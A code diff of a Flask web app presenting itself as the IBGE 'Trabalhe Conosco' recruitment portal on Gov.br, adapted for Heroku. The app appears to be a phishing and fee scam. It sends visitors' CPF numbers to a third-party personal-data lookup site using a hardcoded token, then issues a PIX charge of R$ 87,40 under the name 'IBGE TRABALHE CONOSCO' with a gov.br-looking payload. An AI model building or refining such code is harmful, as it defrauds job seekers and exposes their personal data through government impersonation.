@@ -1,36 +1,28 @@
 """
-Aplicação Flask simplificada para deploy no Heroku
+Aplicação Flask ultra-simplificada para Heroku
 IBGE Trabalhe Conosco - Portal Gov.br
 """
 import os
 import logging
-from flask import Flask, render_template, request, jsonify, make_response
+import random
+from flask import Flask, render_template, request, jsonify
 
-# Configurar logging para debug no Heroku
+# Configurar logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Criar app Flask básico
+# Criar app Flask
 app = Flask(__name__)
-app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key-change-in-production")
-
-# Configurações básicas
-app.config['DEBUG'] = False
-app.config['TESTING'] = False
-
-# Cache simples
-_cache = {}
+app.secret_key = os.environ.get("SESSION_SECRET", "heroku-ibge-secret-key-2025")
 
 @app.route('/')
 def index():
-    """Página inicial do IBGE Trabalhe Conosco"""
-    response = make_response(render_template('index.html'))
-    response.headers['Cache-Control'] = 'public, max-age=300'
-    return response
+    """Página inicial"""
+    return render_template('index.html')
 
 @app.route('/resultados-busca')
 def resultados_busca():
-    """Página de resultados de busca de vagas"""
+    """Resultados de busca"""
     return render_template('resultados_busca.html')
 
 @app.route('/formulario-inscricao')
@@ -63,12 +55,26 @@ def confirmacao_agendamento():
     """Confirmação de agendamento"""
     return render_template('confirmacao_agendamento.html')
 
+@app.route('/suporte')
+def suporte():
+    """Página de suporte"""
+    return render_template('index.html')
+
+@app.route('/health')
+def health():
+    """Health check para Heroku"""
+    return jsonify({
+        'status': 'ok', 
+        'message': 'IBGE Trabalhe Conosco funcionando no Heroku',
+        'app': 'heroku_app.py'
+    })
+
 @app.route('/validar-cpf', methods=['POST'])
 def validar_cpf():
     """Validar CPF usando API externa"""
-    import requests
-    
     try:
+        import requests
+        
         data = request.get_json()
         cpf = data.get('cpf', '').replace('.', '').replace('-', '')
         
@@ -78,7 +84,7 @@ def validar_cpf():
         # API de validação de CPF
         api_url = f"https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}"
         
-        response = requests.get(api_url, timeout=8)
+        response = requests.get(api_url, timeout=10)
         
         if response.status_code == 200:
             dados = response.json()
@@ -103,23 +109,20 @@ def validar_cpf():
             return jsonify({'success': False, 'message': 'Erro na validação do CPF'})
             
     except Exception as e:
+        logger.error(f"Erro na validação CPF: {str(e)}")
         return jsonify({'success': False, 'message': f'Erro interno: {str(e)}'})
 
 @app.route('/api/gerar-pix', methods=['POST'])
 def gerar_pix():
-    """Gerar pagamento PIX usando Nova Era API"""
+    """Gerar pagamento PIX - Mock para Heroku"""
     try:
-        logger.info("Iniciando geração PIX")
         data = request.get_json()
         
-        # Simular PIX para evitar problemas de import no Heroku
-        import random
-        import time
+        # Gerar PIX mock
+        transacao_id = random.randint(700000, 799999)
+        pix_code = f"00020101021226840014br.gov.bcb.pix2562heroku.pix.gov.br/qr/{transacao_id}5204000053039865802BR5924IBGE TRABALHE CONOSCO6009SAO PAULO62070503***6304{random.randint(1000, 9999)}"
         
-        transacao_id = random.randint(100000, 999999)
-        pix_code = f"00020101021226840014br.gov.bcb.pix2562mock.pix.com/qr/{transacao_id}5204000053039865802BR5924IBGE TRABALHE CONOSCO6009SAO PAULO62070503***6304{random.randint(1000, 9999)}"
-        
-        logger.info(f"PIX gerado - ID: {transacao_id}")
+        logger.info(f"PIX Heroku gerado - ID: {transacao_id}")
         
         return jsonify({
             'success': True,
@@ -128,7 +131,7 @@ def gerar_pix():
             'qr_code': pix_code,
             'valor': "R$ 87,40",
             'status': 'pending',
-            'api_provider': 'Mock PIX para Heroku'
+            'api_provider': 'Heroku Mock PIX - Demo'
         })
             
     except Exception as e:
@@ -140,18 +143,15 @@ def gerar_pix():
 
 @app.route('/api/verificar-pagamento/<int:transacao_id>')
 def verificar_pagamento(transacao_id):
-    """Verificar status do pagamento PIX"""
+    """Verificar status do pagamento PIX - Mock para Heroku"""
     try:
-        logger.info(f"Verificando pagamento: {transacao_id}")
-        
         # Simular verificação para Heroku
-        import random
-        status = 'paid' if random.random() > 0.7 else 'pending'
+        status = 'paid' if random.random() > 0.6 else 'pending'
         
         return jsonify({
             'success': True,
             'status': status,
-            'paid_at': '2024-08-14T01:30:00Z' if status == 'paid' else None,
+            'paid_at': '2025-08-14T01:45:00Z' if status == 'paid' else None,
             'id': transacao_id
         })
         
@@ -162,18 +162,9 @@ def verificar_pagamento(transacao_id):
             'message': f'Erro ao verificar pagamento: {str(e)}'
         })
 
-@app.route('/suporte')
-def suporte():
-    """Página de suporte"""
-    return render_template('index.html')
-
 @app.errorhandler(404)
 def not_found(error):
     """Página 404"""
-    logger.warning(f"404 - Página não encontrada: {request.url}")
-    # Se for uma rota de API, retornar JSON
-    if request.path.startswith('/api/') or request.path in ['/health', '/test-pix']:
-        return jsonify({'error': 'Endpoint não encontrado'}), 404
     return render_template('index.html'), 404
 
 @app.errorhandler(500)
@@ -181,24 +172,6 @@ def internal_error(error):
     """Página 500"""
     logger.error(f"500 - Erro interno: {str(error)}")
     return render_template('index.html'), 500
-
-@app.route('/health')
-def health_check():
-    """Health check para Heroku"""
-    return jsonify({'status': 'ok', 'message': 'IBGE Trabalhe Conosco funcionando'})
-
-@app.route('/test-pix')
-def test_pix():
-    """Teste simples de PIX para debug"""
-    try:
-        return jsonify({
-            'success': True,
-            'message': 'PIX mock funcionando',
-            'transacao_id': 123456,
-            'pix_code': 'mock_pix_code'
-        })
-    except Exception as e:
-        return jsonify({'error': str(e)})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
